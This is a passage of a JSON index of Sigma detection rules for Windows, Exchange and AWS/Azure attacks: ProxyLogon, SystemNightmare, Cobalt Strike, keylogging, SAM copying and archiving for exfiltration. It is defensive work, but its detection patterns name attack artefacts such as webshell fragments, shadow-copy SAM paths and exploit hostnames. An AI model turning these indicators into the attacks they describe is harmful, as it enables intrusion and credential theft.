\u0026#39;.aspx\u0026#39; role_assignment: - \u0026#39;New-ManagementRoleAssignment\u0026#39; - \u0026#39; -Role \u0026#34;Mailbox Import Export\u0026#34;\u0026#39; - \u0026#39; -User \u0026#39; condition: (all of export_command and export_params) or all of role_assignment falsepositives: - unlikely level: critical tags: - attack.persistence - attack.t1505.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/msexchange/win_exchange_proxyshell_mailbox_export.yml/","tags":["attack.persistence","attack.t1505.003"],"title":"Mailbox Export to Exchange Webserver"},{"categories":null,"contents":"Detects the exploitation of PrinterNightmare to get a shell as LOCAL_SYSTEM\nKnown false-positives Unknown References https://github.com/GossiTheDog/SystemNightmare Raw rule (edit) title: SystemNightmare Exploitation Script Execution id: c01f7bd6-0c1d-47aa-9c61-187b91273a16 status: test description: Detects the exploitation of PrinterNightmare to get a shell as LOCAL_SYSTEM references: - https://github.com/GossiTheDog/SystemNightmare author: Florian Roth date: 2021/08/11 tags: - attack.privilege_escalation - attack.t1068 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - \u0026#39;printnightmare.gentilkiwi.com\u0026#39; - \u0026#39; /user:gentilguest \u0026#39; - \u0026#39;Kiwi Legit Printer\u0026#39; condition: selection falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_exploit_systemnightmare.yml/","tags":["attack.privilege_escalation","attack.t1068"],"title":"SystemNightmare Exploitation Script Execution"},{"categories":null,"contents":"When exploiting this vulnerability with CVE-2021–26858, an SSRF attack is used to manipulate virtual directories\nKnown false-positives Unlikely References https://bi-zone.medium.com/hunting-down-ms-exchange-attacks-part-1-proxylogon-cve-2021-26855-26858-27065-26857-6e885c5f197c Raw rule (edit) title: ProxyLogon Reset Virtual Directories Based On IIS Log id: effee1f6-a932-4297-a81f-acb44064fa3a status: experimental description: When exploiting this vulnerability with CVE-2021–26858, an SSRF attack is used to manipulate virtual directories references: - https://bi-zone.medium.com/hunting-down-ms-exchange-attacks-part-1-proxylogon-cve-2021-26855-26858-27065-26857-6e885c5f197c author: frack113 date: 2021/08/10 logsource: product: windows category: webserver definition: w3c-logging must be enable https://docs.microsoft.com/en-us/windows/win32/http/w3c-logging detection: selection: cs-method: \u0026#39;POST\u0026#39; sc-status: 200 cs-uri-stem: \u0026#39;/ecp/DDI/DDIService.svc/SetObject\u0026#39; cs-uri-query|contains|all: - \u0026#39;schema=Reset\u0026#39; - \u0026#39;VirtualDirectory\u0026#39; cs-username|endswith: \u0026#39;$\u0026#39; keywords: - \u0026#39;POST\u0026#39; - \u0026#39;200\u0026#39; - \u0026#39;/ecp/DDI/DDIService.svc/SetObject\u0026#39; - \u0026#39;schema=Reset\u0026#39; - \u0026#39;VirtualDirectory\u0026#39; - \u0026#39;$\u0026#39; condition: selection or all of keywords falsepositives: - Unlikely level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2021_26858_iis_rce.yml/","tags":null,"title":"ProxyLogon Reset Virtual Directories Based On IIS Log"},{"categories":null,"contents":"Detects specific patterns found after a successful ProxyLogon exploitation in relation to a Commandlet invocation of Set-OabVirtualDirectory\nKnown false-positives Unlikely References https://bi-zone.medium.com/hunting-down-ms-exchange-attacks-part-1-proxylogon-cve-2021-26855-26858-27065-26857-6e885c5f197c Raw rule (edit) title: ProxyLogon MSExchange OabVirtualDirectory id: 550d3350-bb8a-4ff3-9533-2ba533f4a1c0 status: experimental description: Detects specific patterns found after a successful ProxyLogon exploitation in relation to a Commandlet invocation of Set-OabVirtualDirectory references: - https://bi-zone.medium.com/hunting-down-ms-exchange-attacks-part-1-proxylogon-cve-2021-26855-26858-27065-26857-6e885c5f197c author: Florian Roth date: 2021/08/09 logsource: product: windows service: msexchange-management detection: selection_cmdlet: - \u0026#39;OabVirtualDirectory\u0026#39; - \u0026#39; -ExternalUrl \u0026#39; selection_params: - \u0026#39;eval(request\u0026#39; - \u0026#39;http://f/\u0026lt;script\u0026#39; - \u0026#39;\u0026#34;unsafe\u0026#34;};\u0026#39; - \u0026#39;function Page_Load()\u0026#39; condition: all of selection_cmdlet and selection_params falsepositives: - Unlikely level: critical tags: - attack.t1587.001 - attack.resource_development ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/msexchange/win_exchange_proxylogon_oabvirtualdir.yml/","tags":["attack.t1587.001","attack.resource_development"],"title":"ProxyLogon MSExchange OabVirtualDirectory"},{"categories":null,"contents":"Detects command line parameters used by ADCSPwn, a tool to escalate privileges in an active directory network by coercing authenticate from machine accounts and relaying to the certificate service\nKnown false-positives unlikely References https://github.com/bats3c/ADCSPwn Raw rule (edit) title: ADCSPwn Hack Tool id: cd8c163e-a19b-402e-bdd5-419ff5859f12 description: Detects command line parameters used by ADCSPwn, a tool to escalate privileges in an active directory network by coercing authenticate from machine accounts and relaying to the certificate service status: test author: Florian Roth references: - https://github.com/bats3c/ADCSPwn date: 2021/07/31 tags: - attack.credential_access - attack.t1557.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39; --adcs \u0026#39; - \u0026#39; --port \u0026#39; condition: selection falsepositives: - unlikely level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_hack_adcspwn.yml/","tags":["attack.credential_access","attack.t1557.001"],"title":"ADCSPwn Hack Tool"},{"categories":null,"contents":"Detects the load of the Windiver driver, a powerful user-mode capture/sniffing/modification/blocking/re-injection package for Windows\nKnown false-positives legitimate WinDivert driver usage References https://reqrypt.org/windivert-doc.html https://rastamouse.me/ntlm-relaying-via-cobalt-strike/ Raw rule (edit) title: WinDivert Driver Load id: 679085d5-f427-4484-9f58-1dc30a7c426d status: experimental description: Detects the load of the Windiver driver, a powerful user-mode capture/sniffing/modification/blocking/re-injection package for Windows author: Florian Roth date: 2021/07/30 references: - https://reqrypt.org/windivert-doc.html - https://rastamouse.me/ntlm-relaying-via-cobalt-strike/ tags: - attack.collection - attack.defense_evasion - attack.t1599.001 - attack.t1557.001 logsource: category: driver_load product: windows detection: selection: ImageLoaded|contains: - \u0026#39;\\WinDivert.sys\u0026#39; - \u0026#39;\\WinDivert64.sys\u0026#39; condition: selection falsepositives: - legitimate WinDivert driver usage level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/driver_load/driver_load_windivert.yml/","tags":["attack.collection","attack.defense_evasion","attack.t1599.001","attack.t1557.001"],"title":"WinDivert Driver Load"},{"categories":null,"contents":"Adversaries can use the inbuilt expand utility to decompress cab files as seen in recent Iranian MeteorExpress attack\nKnown false-positives System administrator Usage References https://labs.sentinelone.com/meteorexpress-mysterious-wiper-paralyzes-iranian-trains-with-epic-troll https://blog.malwarebytes.com/threat-intelligence/2021/08/new-variant-of-konni-malware-used-in-campaign-targetting-russia/ Raw rule (edit) title: Cabinet File Expansion status: experimental id: 9f107a84-532c-41af-b005-8d12a607639f author: Bhabesh Raj date: 2021/07/30 modified: 2021/08/31 description: Adversaries can use the inbuilt expand utility to decompress cab files as seen in recent Iranian MeteorExpress attack references: - https://labs.sentinelone.com/meteorexpress-mysterious-wiper-paralyzes-iranian-trains-with-epic-troll - https://blog.malwarebytes.com/threat-intelligence/2021/08/new-variant-of-konni-malware-used-in-campaign-targetting-russia/ tags: - attack.execution - attack.t1218 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\expand.exe\u0026#39; CommandLine|contains: - \u0026#39;.cab\u0026#39; - \u0026#39;/F:\u0026#39; - \u0026#39;-F:\u0026#39; - \u0026#39;C:\\ProgramData\\\u0026#39; #Suspicious paths to curb FPs if any - \u0026#39;C:\\Public\\\u0026#39; - \u0026#39;\\AppData\\Local\\Temp\\\u0026#39; - \u0026#39;\\AppData\\Roaming\\Temp\\\u0026#39; condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - System administrator Usage level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_expand_cabinet_files.yml/","tags":["attack.execution","attack.t1218"],"title":"Cabinet File Expansion"},{"categories":null,"contents":"Adversaries may log user keystrokes to intercept credentials as the user types them.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1 Raw rule (edit) title: Powershell Keylogging id: 34f90d3c-c297-49e9-b26d-911b05a4866c status: experimental author: frack113 date: 2021/07/30 modified: 2021/10/16 description: Adversaries may log user keystrokes to intercept credentials as the user types them. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1 tags: - attack.collection - attack.t1056.001 logsource: product: windows category: ps_script definition: EnableScriptBlockLogging must be set to enable detection: selection_basic: ScriptBlockText|contains: \u0026#39;Get-Keystrokes\u0026#39; selection_high: # want to run in background and keyboard ScriptBlockText|contains|all: - \u0026#39;Get-ProcAddress user32.dll GetAsyncKeyState\u0026#39; - \u0026#39;Get-ProcAddress user32.dll GetForegroundWindow\u0026#39; condition: selection_basic or selection_high falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_keylogging.yml/","tags":["attack.collection","attack.t1056.001"],"title":"Powershell Keylogging"},{"categories":null,"contents":"Once established within a system or network, an adversary may use automated techniques for collecting internal data.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1119/T1119.md Raw rule (edit) title: Recon Information for Export with Command Prompt id: aa2efee7-34dd-446e-8a37-40790a66efd7 status: experimental author: frack113 date: 2021/07/30 description: Once established within a system or network, an adversary may use automated techniques for collecting internal data. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1119/T1119.md tags: - attack.collection - attack.t1119 logsource: product: windows category: process_creation detection: selection_image: Image|endswith: - \u0026#39;\\tree.com\u0026#39; - \u0026#39;\\WMIC.exe\u0026#39; - \u0026#39;\\doskey.exe\u0026#39; - \u0026#39;\\sc.exe\u0026#39; selection_redirect: ParentCommandLine|contains: \u0026#39; \u0026gt; %TEMP%\\\u0026#39; condition: selection_image and selection_redirect falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_recon.yml/","tags":["attack.collection","attack.t1119"],"title":"Recon Information for Export with Command Prompt"},{"categories":null,"contents":"Detects suspicious PowerShell scripts accessing SAM hives\nKnown false-positives Some rare backup scenarios PowerShell scripts fixing HiveNightmare / SeriousSAM ACLs References https://twitter.com/splinter_code/status/1420546784250769408 Raw rule (edit) title: PowerShell SAM Copy id: 1af57a4b-460a-4738-9034-db68b880c665 description: Detects suspicious PowerShell scripts accessing SAM hives status: experimental references: - https://twitter.com/splinter_code/status/1420546784250769408 author: Florian Roth date: 2021/07/29 modified: 2021/12/02 tags: - attack.credential_access - attack.t1003.002 logsource: category: process_creation product: windows detection: selection_1: CommandLine|contains|all: - \u0026#39;\\HarddiskVolumeShadowCopy\u0026#39; - \u0026#39;ystem32\\config\\sam\u0026#39; selection_2: CommandLine|contains: - \u0026#39;Copy-Item\u0026#39; - \u0026#39;cp $_.\u0026#39; - \u0026#39;cpi $_.\u0026#39; - \u0026#39;copy $_.\u0026#39; - \u0026#39;.File]::Copy(\u0026#39; condition: all of selection* falsepositives: - Some rare backup scenarios - PowerShell scripts fixing HiveNightmare / SeriousSAM ACLs level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_powershell_sam_access.yml/","tags":["attack.credential_access","attack.t1003.002"],"title":"PowerShell SAM Copy"},{"categories":null,"contents":"Detects the usage of the direct syscall of NtOpenProcess which might be done from a CobaltStrike BOF.\nKnown false-positives unknown References https://medium.com/falconforce/falconfriday-direct-system-calls-and-cobalt-strike-bofs-0xff14-741fa8e1bdd6 Raw rule (edit) title: Direct Syscall of NtOpenProcess id: 3f3f3506-1895-401b-9cc3-e86b16e630d0 description: Detects the usage of the direct syscall of NtOpenProcess which might be done from a CobaltStrike BOF. references: - https://medium.com/falconforce/falconfriday-direct-system-calls-and-cobalt-strike-bofs-0xff14-741fa8e1bdd6 status: experimental author: Christian Burkard date: 2021/07/28 logsource: category: process_access product: windows detection: selection: CallTrace|startswith: \u0026#39;UNKNOWN\u0026#39; condition: selection falsepositives: - unknown level: critical tags: - attack.execution - attack.t1106 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_direct_syscall_ntopenprocess.yml/","tags":["attack.execution","attack.t1106"],"title":"Direct Syscall of NtOpenProcess"},{"categories":null,"contents":"Once established within a system or network, an adversary may use automated techniques for collecting internal data.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1119/T1119.md Raw rule (edit) title: Automated Collection Command PowerShell id: c1dda054-d638-4c16-afc8-53e007f3fbc5 status: experimental author: frack113 date: 2021/07/28 modified: 2021/12/02 description: Once established within a system or network, an adversary may use automated techniques for collecting internal data. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1119/T1119.md tags: - attack.collection - attack.t1119 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_ext: ScriptBlockText|contains: - \u0026#39;.doc\u0026#39; - \u0026#39;.docx\u0026#39; - \u0026#39;.xls\u0026#39; - \u0026#39;.xlsx\u0026#39; - \u0026#39;.ppt\u0026#39; - \u0026#39;.pptx\u0026#39; - \u0026#39;.rtf\u0026#39; - \u0026#39;.pdf\u0026#39; - \u0026#39;.txt\u0026#39; selection_cmd: ScriptBlockText|contains|all: - \u0026#39;Get-ChildItem\u0026#39; - \u0026#39; -Recurse \u0026#39; - \u0026#39; -Include \u0026#39; condition: all of selection* falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_automated_collection.yml/","tags":["attack.collection","attack.t1119"],"title":"Automated Collection Command PowerShell"},{"categories":null,"contents":"Once established within a system or network, an adversary may use automated techniques for collecting internal data.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1119/T1119.md https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md Raw rule (edit) title: Automated Collection Command Prompt id: f576a613-2392-4067-9d1a-9345fb58d8d1 status: experimental author: frack113 date: 2021/07/28 description: Once established within a system or network, an adversary may use automated techniques for collecting internal data. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1119/T1119.md - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md logsource: category: process_creation product: windows detection: selection_ext: CommandLine|contains: - \u0026#39;.doc\u0026#39; - \u0026#39;.docx\u0026#39; - \u0026#39;.xls\u0026#39; - \u0026#39;.xlsx\u0026#39; - \u0026#39;.ppt\u0026#39; - \u0026#39;.pptx\u0026#39; - \u0026#39;.rtf\u0026#39; - \u0026#39;.pdf\u0026#39; - \u0026#39;.txt\u0026#39; selection_dir: CommandLine|contains|all: - \u0026#39;dir \u0026#39; - \u0026#39; /b \u0026#39; - \u0026#39; /s \u0026#39; selection_findstr: OriginalFileName: FINDSTR.EXE CommandLine|contains: - \u0026#39; /e \u0026#39; - \u0026#39; /si \u0026#39; condition: selection_ext and (selection_dir or selection_findstr) falsepositives: - Unknown level: medium tags: - attack.collection - attack.t1119 - attack.credential_access - attack.t1552.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_automated_collection.yml/","tags":["attack.collection","attack.t1119","attack.credential_access","attack.t1552.001"],"title":"Automated Collection Command Prompt"},{"categories":null,"contents":"Once established within a system or network, an adversary may use automated techniques for collecting internal data\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1119/T1119.md Raw rule (edit) title: Recon Information for Export with PowerShell id: a9723fcc-881c-424c-8709-fd61442ab3c3 status: experimental author: frack113 date: 2021/07/30 modified: 2021/12/02 description: Once established within a system or network, an adversary may use automated techniques for collecting internal data references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1119/T1119.md tags: - attack.collection - attack.t1119 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_action: ScriptBlockText|contains: - \u0026#39;Get-Service \u0026#39; - \u0026#39;Get-ChildItem \u0026#39; - \u0026#39;Get-Process \u0026#39; selection_redirect: ScriptBlockText|contains: \u0026#39;\u0026gt; $env:TEMP\\\u0026#39; condition: all of selection* falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_recon.yml/","tags":["attack.collection","attack.t1119"],"title":"Recon Information for Export with PowerShell"},{"categories":null,"contents":"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities\nKnown false-positives Command line parameter combinations that contain all included strings References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md Raw rule (edit) title: Compress Data and Lock With Password for Exfiltration With 7-ZIP id: 9fbf5927-5261-4284-a71d-f681029ea574 status: experimental author: frack113 date: 2021/07/27 modified: 2021/12/02 description: An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md tags: - attack.collection - attack.t1560.001 logsource: category: process_creation product: windows detection: selection_7z: CommandLine|contains: - \u0026#39;7z.exe\u0026#39; - \u0026#39;7za.exe\u0026#39; selection_password: CommandLine|contains: \u0026#39; -p\u0026#39; selection_action: CommandLine|contains: - \u0026#39; a \u0026#39; - \u0026#39; u \u0026#39; condition: all of selection* falsepositives: - Command line parameter combinations that contain all included strings level: medium fields: - CommandLine - ParentCommandLine - CurrentDirectory ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_7z.yml/","tags":["attack.collection","attack.t1560.001"],"title":"Compress Data and Lock With Password for Exfiltration With 7-ZIP"},{"categories":null,"contents":"Detects process patterns found in Cobalt Strike beacon activity (see reference for more details)\nKnown false-positives Other programs that cause these patterns (please report) References https://hausec.com/2021/07/26/cobalt-strike-and-tradecraft/ https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/ Raw rule (edit) title: CobaltStrike Process Patterns id: f35c5d71-b489-4e22-a115-f003df287317 status: experimental description: Detects process patterns found in Cobalt Strike beacon activity (see reference for more details) author: Florian Roth references: - https://hausec.com/2021/07/26/cobalt-strike-and-tradecraft/ - https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/ date: 2021/07/27 modified: 2022/03/05 tags: - attack.execution - attack.t1059 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: \u0026#39;\\cmd.exe /C whoami\u0026#39; ParentImage|startswith: \u0026#39;C:\\Temp\u0026#39; selection2: CommandLine|contains: \u0026#39;conhost.exe 0xffffffff -ForceV1\u0026#39; ParentCommandLine|contains: - \u0026#39;/C whoami\u0026#39; - \u0026#39;cmd.exe /C echo\u0026#39; - \u0026#39; \u0026gt; \\\\\\\\.\\\\pipe\u0026#39; selection3: CommandLine|contains: - \u0026#39;cmd.exe /c echo\u0026#39; - \u0026#39;\u0026gt; \\\\\\\\.\\\\pipe\u0026#39; - \u0026#39;\\whoami.exe\u0026#39; ParentImage|endswith: \u0026#39;\\dllhost.exe\u0026#39; selection4: Image|endswith: \u0026#39;\\cmd.exe\u0026#39; ParentImage|endswith: \u0026#39;\\runonce.exe\u0026#39; ParentCommandLine|endswith: \u0026#39;\\runonce.exe\u0026#39; condition: 1 of selection* falsepositives: - Other programs that cause these patterns (please report) level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_cobaltstrike_process_patterns.yml/","tags":["attack.execution","attack.t1059"],"title":"CobaltStrike Process Patterns"},{"categories":null,"contents":"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md Raw rule (edit) title: Compress Data and Lock With Password for Exfiltration With WINZIP id: e2e80da2-8c66-4e00-ae3c-2eebd29f6b6d status: experimental author: frack113 date: 2021/07/27 modified: 2021/12/02 description: An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md tags: - attack.collection - attack.t1560.001 logsource: category: process_creation product: windows detection: selection_winzip: CommandLine|contains: - \u0026#39;winzip.exe\u0026#39; - \u0026#39;winzip64.exe\u0026#39; selection_password: CommandLine|contains: - \u0026#39;-s\u0026#34;\u0026#39; selection_other: CommandLine|contains: - \u0026#39; -min \u0026#39; - \u0026#39; -a \u0026#39; condition: all of selection* falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_winzip.yml/","tags":["attack.collection","attack.t1560.001"],"title":"Compress Data and Lock With Password for Exfiltration With WINZIP"},{"categories":null,"contents":"Adversaries may collect data stored in the clipboard from users copying information within or between applications.\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/clip https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1115/T1115.md Raw rule (edit) title: Use of CLIP id: ddeff553-5233-4ae9-bbab-d64d2bd634be status: experimental author: frack113 date: 2021/07/27 description: Adversaries may collect data stored in the clipboard from users copying information within or between applications. references: - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/clip - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1115/T1115.md tags: - attack.collection - attack.t1115 logsource: category: process_creation product: windows detection: selection: OriginalFileName: clip.exe condition: selection falsepositives: - Unknown level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_clip.yml/","tags":["attack.collection","attack.t1115"],"title":"Use of CLIP"},{"categories":null,"contents":"Detects evade to Macie detection.\nKnown false-positives System or Network administrator behaviors References https://docs.aws.amazon.com/cli/latest/reference/macie/ Raw rule (edit) title: AWS Macie Evasion id: 91f6a16c-ef71-437a-99ac-0b070e3ad221 status: experimental description: Detects evade to Macie detection. author: Sittikorn S date: 2021/07/06 references: - https://docs.aws.amazon.com/cli/latest/reference/macie/ tags: - attack.defense_evasion - attack.t1562.001 logsource: product: aws service: cloudtrail detection: selection: eventName: - \u0026#39;ArchiveFindings\u0026#39; - \u0026#39;CreateFindingsFilter\u0026#39; - \u0026#39;DeleteMember\u0026#39; - \u0026#39;DisassociateFromMasterAccount\u0026#39; - \u0026#39;DisassociateMember\u0026#39; - \u0026#39;DisableMacie\u0026#39; - \u0026#39;DisableOrganizationAdminAccount\u0026#39; - \u0026#39;UpdateFindingsFilter\u0026#39; - \u0026#39;UpdateMacieSession\u0026#39; - \u0026#39;UpdateMemberSession\u0026#39; - \u0026#39;UpdateClassificationJob\u0026#39; timeframe: 10m condition: selection | count() by sourceIPAddress \u0026gt; 5 fields: - sourceIPAddress - userIdentity.arn falsepositives: - System or Network administrator behaviors level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_macic_evasion.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"AWS Macie Evasion"},{"categories":null,"contents":"Identifies the suspicious use of GetSessionToken. Tokens could be created and used by attackers to move laterally and escalate privileges.\nKnown false-positives GetSessionToken may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. GetSessionToken from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://github.com/elastic/detection-rules/pull/1213 https://docs.aws.amazon.com/STS/latest/APIReference/API_GetSessionToken.html Raw rule (edit) title: AWS STS GetSessionToken Misuse id: b45ab1d2-712f-4f01-a751-df3826969807 description: Identifies the suspicious use of GetSessionToken. Tokens could be created and used by attackers to move laterally and escalate privileges. author: Austin Songer @austinsonger status: experimental date: 2021/07/24 references: - https://github.com/elastic/detection-rules/pull/1213 - https://docs.aws.amazon.com/STS/latest/APIReference/API_GetSessionToken.html logsource: product: aws service: cloudtrail detection: selection: eventSource: sts.amazonaws.com eventName: GetSessionToken userIdentity.type: IAMUser condition: selection level: low tags: - attack.lateral_movement - attack.privilege_escalation - attack.t1548 - attack.t1550 - attack.t1550.001 falsepositives: - GetSessionToken may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. GetSessionToken from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_sts_getsessiontoken_misuse.yml/","tags":["attack.lateral_movement","attack.privilege_escalation","attack.t1548","attack.t1550","attack.t1550.001"],"title":"AWS STS GetSessionToken Misuse"},{"categories":null,"contents":"Identifies the suspicious use of AssumeRole. Attackers could move laterally and escalate privileges.\nKnown false-positives AssumeRole may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. AssumeRole from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. Automated processes that uses Terraform may lead to false positives. References https://github.com/elastic/detection-rules/pull/1214 https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html Raw rule (edit) title: AWS STS AssumeRole Misuse id: 905d389b-b853-46d0-9d3d-dea0d3a3cd49 description: Identifies the suspicious use of AssumeRole. Attackers could move laterally and escalate privileges. author: Austin Songer @austinsonger status: experimental date: 2021/07/24 modified: 2021/08/20 references: - https://github.com/elastic/detection-rules/pull/1214 - https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html logsource: product: aws service: cloudtrail detection: selection: userIdentity.type: AssumedRole userIdentity.sessionContext.sessionIssuer.type: Role condition: selection level: low tags: - attack.lateral_movement - attack.privilege_escalation - attack.t1548 - attack.t1550 - attack.t1550.001 falsepositives: - AssumeRole may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - AssumeRole from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. - Automated processes that uses Terraform may lead to false positives. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_sts_assumerole_misuse.yml/","tags":["attack.lateral_movement","attack.privilege_escalation","attack.t1548","attack.t1550","attack.t1550.001"],"title":"AWS STS AssumeRole Misuse"},{"categories":null,"contents":"Detects when a user tampers with S3 data management in Amazon Web Services.\nKnown false-positives A S3 configuration change may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. S3 configuration change from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://github.com/elastic/detection-rules/pull/1145/files https://docs.aws.amazon.com/AmazonS3/latest/API/API_Operations.html https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutBucketLogging.html https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutBucketWebsite.html https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutBucketEncryption.html https://docs.aws.amazon.com/AmazonS3/latest/userguide/setting-repl-config-perm-overview.html https://docs.aws.amazon.com/AmazonS3/latest/API/API_RestoreObject.html Raw rule (edit) title: AWS S3 Data Management Tampering id: 78b3756a-7804-4ef7-8555-7b9024a02e2d description: Detects when a user tampers with S3 data management in Amazon Web Services. author: Austin Songer @austinsonger status: experimental date: 2021/07/24 modified: 2021/08/19 references: - https://github.com/elastic/detection-rules/pull/1145/files - https://docs.aws.amazon.com/AmazonS3/latest/API/API_Operations.html - https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutBucketLogging.html - https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutBucketWebsite.html - https://docs.aws.amazon.com/AmazonS3/latest/API/API_PutBucketEncryption.html - https://docs.aws.amazon.com/AmazonS3/latest/userguide/setting-repl-config-perm-overview.html - https://docs.aws.amazon.com/AmazonS3/latest/API/API_RestoreObject.html logsource: product: aws service: cloudtrail detection: selection: eventSource: s3.amazonaws.com eventName: - PutBucketLogging - PutBucketWebsite - PutEncryptionConfiguration - PutLifecycleConfiguration - PutReplicationConfiguration - ReplicateObject - RestoreObject condition: selection level: low tags: - attack.exfiltration - attack.t1537 falsepositives: - A S3 configuration change may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. S3 configuration change from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_s3_data_management_tampering.yml/","tags":["attack.exfiltration","attack.t1537"],"title":"AWS S3 Data Management Tampering"},{"categories":null,"contents":"Identifies the deletion of Azure Kubernetes Pods.\nKnown false-positives Pods may be deleted by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Pods deletions from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes https://github.com/elastic/detection-rules/blob/065bf48a9987cd8bd826c098a30ce36e6868ee46/rules/integrations/azure/impact_kubernetes_pod_deleted.toml Raw rule (edit) title: Azure Kubernetes Pods Deleted id: b02f9591-12c3-4965-986a-88028629b2e1 description: Identifies the deletion of Azure Kubernetes Pods. author: Austin Songer @austinsonger status: experimental date: 2021/07/24 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes - https://github.com/elastic/detection-rules/blob/065bf48a9987cd8bd826c098a30ce36e6868ee46/rules/integrations/azure/impact_kubernetes_pod_deleted.toml logsource: product: azure service: 